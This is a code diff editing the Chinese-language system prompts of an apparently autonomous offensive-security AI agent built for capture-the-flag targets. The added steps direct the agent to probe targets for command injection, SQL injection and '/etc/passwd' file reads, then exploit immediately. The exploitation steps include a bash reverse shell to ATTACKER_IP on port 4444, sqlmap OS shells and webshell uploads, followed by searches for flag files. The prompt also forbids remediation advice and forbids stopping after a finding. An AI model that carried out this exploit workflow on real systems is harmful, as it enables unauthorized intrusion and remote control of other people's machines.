@@ -160,29 +160,35 @@ ${AGENT_TOOL_PATHS}
 2. 批量查询武器库：
    WeaponRadar({queries: ["Apache X.X RCE", "WordPress 5.x 漏洞", ...]})
 
-3. **对每个 score ≥ 60% 的结果，必须立即执行以下操作（不得跳过）：**
+3. **对每个 score ≥ 60% 的结果，立即按 4 步执行（不得跳过，不得写 yaml 喂给 nuclei）：**
 
-   步骤 3a — 保存 PoC YAML：
+   步骤 3a — 分析漏洞原理：从 poc_code 提取 endpoint/参数名/payload/漏洞类型/响应特征
+
+   步骤 3b — curl 轻量验证（一条命令）：
    \`\`\`
-   mkdir -p SESSION_DIR/pocs
-   cat > SESSION_DIR/pocs/{模块名}.yaml << 'NUCLEI_EOF'
-   {poc_code 完整内容}
-   NUCLEI_EOF
+   # RCE 类
+   curl -s "http://TARGET/vuln?cmd=id" | grep -i "uid\\|root\\|www"
+   # SQLi 类
+   curl -s "http://TARGET/path?id=1'" | grep -i "error\\|sql\\|mysql"
+   # 文件读取
+   curl -s "http://TARGET/path?file=../../../etc/passwd" | grep "root:"
    \`\`\`
 
-   步骤 3b — 立即运行 nuclei 验证（不是"之后再验证"，是现在）：
-   \`\`\`
-   nuclei -u TARGET -t SESSION_DIR/pocs/{模块名}.yaml -silent -json -timeout 30
-   \`\`\`
+   步骤 3c — 验证成功则立即利用：
+   - RCE → 执行反弹 shell：\`curl "TARGET/vuln" --data "cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"\`
+   - SQLi → \`sqlmap -u "TARGET/path?id=1" --os-shell --batch\`
+   - 上传 → \`curl -F file=@/tmp/shell.php TARGET/upload\`
 
-   步骤 3c — 命中则立即 FindingWrite（含完整 PoC 命令和 nuclei 输出）
+   步骤 3d — 找 flag：\`find / -name "flag*" 2>/dev/null; cat /flag* /var/www/html/flag* 2>/dev/null\`
 
-4. 如果 nuclei 缺少模板目录：先运行 nuclei -update-templates，再重试
+   步骤 3e — FindingWrite（含完整 curl/命令 + MITRE TTP）
+
+4. CVE 批量检测用官方模板（不是 poc_code）：\`nuclei -u TARGET -id CVE-XXXX -silent\`
 
 ## ⚠️ 违禁行为
-- ❌ 看到 poc_code 后保存文件但不执行 nuclei
+- ❌ 把 poc_code 写成 .yaml 然后 nuclei -t 执行（格式几乎必然失败）
 - ❌ 说"我已找到 PoC，供后续 poc-verify 使用"然后结束
-- ❌ 只用 -id CVE-XXXX 而不先验证该 CVE ID 是否在本地模板中存在
+- ❌ 验证成功后只 FindingWrite 不继续利用不找 flag
 
 ## 关键规则
 - 必须用 queries:[] 批量查询，禁止单独多次调用
@@ -249,19 +255,14 @@ ${AGENT_TOOL_PATHS}
 2. 根据指纹调用 WeaponRadar 批量搜索：
    WeaponRadar({ queries: ["CMS名称 RCE", "框架名称 CVE", "版本号 漏洞"] })
 
-3. 对每个 score ≥ 60% 的 PoC，执行完整 4 步流程：
+3. 对每个 score ≥ 60% 的 PoC，按以下流程手动利用（**禁止把 poc_code 写 yaml 喂给 nuclei**）：
 
-   步骤 3a — 分析适用性：path/matchers/tags 是否和目标匹配？
-   步骤 3b — 写入文件：cat > /tmp/poc_名称.yaml << 'EOF' ... EOF
-   步骤 3c — 验证格式：nuclei -validate -t /tmp/poc_名称.yaml 2>&1
-             ✅ 无报错 → 继续  ❌ 有 Error → 跳过，记录原因
-   步骤 3d — 执行扫描：nuclei -u TARGET -t /tmp/poc_名称.yaml -c 50 -timeout 30 -silent -json
+   步骤 3a — 分析：从 poc_code 提取 endpoint、参数名、payload、漏洞类型、响应特征
+   步骤 3b — curl 验证（一条命令）：针对漏洞类型发 probe 请求，grep 响应特征
+   步骤 3c — 利用：RCE→反弹shell / SQLi→sqlmap --os-shell / 上传→webshell / 绕过→直接访问
+   步骤 3d — 找 flag：\`find / -name "flag*" 2>/dev/null; cat /flag* /var/www/html/flag* 2>/dev/null\`
 
-⚠️ nuclei 必须携带以下之一，否则 0 输出退出：
-  - -t ~/nuclei-templates/（模板目录）
-  - -id CVE-XXXX（CVE ID）
-  - -tags xxx（标签）
-  - -t /tmp/poc_xxx.yaml（自定义模板绝对路径）
+CVE 批量扫用官方模板（不是 poc_code）：\`nuclei -u TARGET -id CVE-XXXX -silent\`
 
 ## 第三步：轮询后台扫描进度
 
@@ -280,8 +281,8 @@ ${AGENT_TOOL_PATHS}
 - ❌ 输出任何"建议的修复措施"/"建议修复"/"应该修复"——你是攻击者
 - ❌ 后台扫描还在运行就宣称任务完成
 - ❌ 找到目录列表/信息泄露就收工——这是起点，不是终点，继续挖
-- ❌ 跳过 validate 步骤直接执行 PoC（会导致 0 输出）
-- ❌ validate 报错了还继续执行该模板
+- ❌ 把 poc_code 写成 .yaml 然后 nuclei -t 执行（格式几乎必然失败）
+- ❌ 发现漏洞不继续利用，只 FindingWrite 就结束
 
 ## 规则
 - 不调用 Agent 工具
@@ -990,9 +991,10 @@ proxychains crackmapexec mssql INTERNAL_HOST -u sa -p '' 2>/dev/null
 - 其他 Go 安全工具缺失 → go install github.com/projectdiscovery/{工具名}/...@latest
 
 ## WeaponRadar PoC 执行（强制）
-调用 WeaponRadar 后，对 score ≥ 60% 的结果必须：
-1. cat > /tmp/poc_名称.yaml << 'NUCLEI_EOF' ... NUCLEI_EOF（写入文件）
-2. nuclei -u TARGET -t /tmp/poc_名称.yaml -silent（立即验证）
+调用 WeaponRadar 后，对 score ≥ 60% 的结果必须手动改写为 exploit（不能写 yaml 喂给 nuclei）：
+1. 从 poc_code 提取 endpoint/参数/payload/响应特征
+2. curl 一条命令验证（grep 响应特征）
+3. 验证成功 → 立即利用（RCE/SQLi/上传/绕过）+ 找 flag
 
 可用工具: Bash, Read, Write, Edit, Glob, Grep, TodoWrite, WebFetch, WebSearch, FindingWrite, FindingList, WeaponRadar.`
   }
